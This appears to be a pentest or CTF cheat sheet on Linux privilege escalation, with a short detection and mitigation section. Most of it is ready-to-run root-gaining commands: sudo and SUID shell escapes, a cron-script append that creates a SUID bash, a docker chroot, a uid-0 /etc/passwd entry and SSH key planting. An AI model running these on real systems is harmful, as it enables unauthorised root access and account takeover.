---
title: Linux privesc — sudo, SUID, capabilities and cron
tags: [linux, privesc, sudo, suid, gtfobins]
---

# Linux privesc: the checklist

**English** | [🇪🇸 Español](linux-sudo-suid.md)

## 1. Context first

```bash
id; sudo -n -l 2>/dev/null; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

That solves most easy boxes. Then cron, services, writable files and groups.

## 2. `sudo`

```bash
sudo -l
```

Every line is a path:

| Rule | What to do |
|---|---|
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `... /usr/bin/find` | `sudo find . -exec /bin/sh \; -quit` |
| `... /bin/systemctl` | `sudo systemctl edit`, own unit with `ExecStart=/bin/sh` |
| `... /usr/bin/less` | `!sh` from the pager |
| `... /usr/bin/env` | `sudo env /bin/sh` |

GTFOBins is the reference: find the binary and the **Sudo** section. Watch for wildcard rules: `sudo /usr/bin/awk '*'` is usually direct execution.

## 3. SUID and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null | while read b; do echo "$b $(getcap "$b")"; done
```

- Standard binary with SUID (`bash`, `find`, `nmap`, `cp`, `tar`): GTFOBins **SUID** section.
- `bash -p` keeps the euid; without `-p` it drops.
- Capabilities: `cap_setuid+ep` on an interpreter is instant root; `cap_dac_read_search` reads `/etc/shadow`.
- Local copy: unusual SUID binaries deserve a download plus `strings`/`ltrace`.

## 4. Cron and services

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all
ps aux --sort=-%cpu | head
```

Patterns: a root-run script you can write, a backup directory with loose permissions, a job calling a binary without an absolute path (**PATH hijack**), or `tar`/`rsync` with wildcards (`--checkpoint-action=exec=sh`).

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
```

## 5. Groups and files

- `docker`: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- `lxd`: publish an image and mount `/` with `security.privileged=true`.
- `disk`: `debugfs` on the disk to read `/etc/shadow`.
- `adm`: log reading; sometimes credentials.
- Writable `/etc/passwd`: add a uid-0 user with a known hash.
- Writable another user's `.ssh`: append your key to `authorized_keys`.

## 6. Typical errors

- **`sudo -l` asks for a password you lack** → try `sudo -n -l` and check `NOPASSWD`; otherwise hunt credentials in config files.
- **GTFOBins fails** → the version changed a flag; check `--help` and adapt.
- **SUID in `/tmp` disappears** → `nosuid` mount; use another directory.
- **Cron never runs** → service stopped, relative path, or file lacks `+x`.
- **Kernel exploit as first option** → crash risk; leave it for last.

## 7. Detection and mitigation

- Audit `sudoers` with `visudo -c` and review wildcard `NOPASSWD` rules.
- Monitor new SUID files (`auditd` with `-p x`) and changes to `cron`/`systemd`.
- Remove users from `docker`, `lxd`, `disk` and `adm`; never grant `sudo` on interpreters.
- Minimal capabilities, reviewed periodically with `getcap -r /`.

MITRE: T1548.003, T1548.001, T1053.003, T1611.
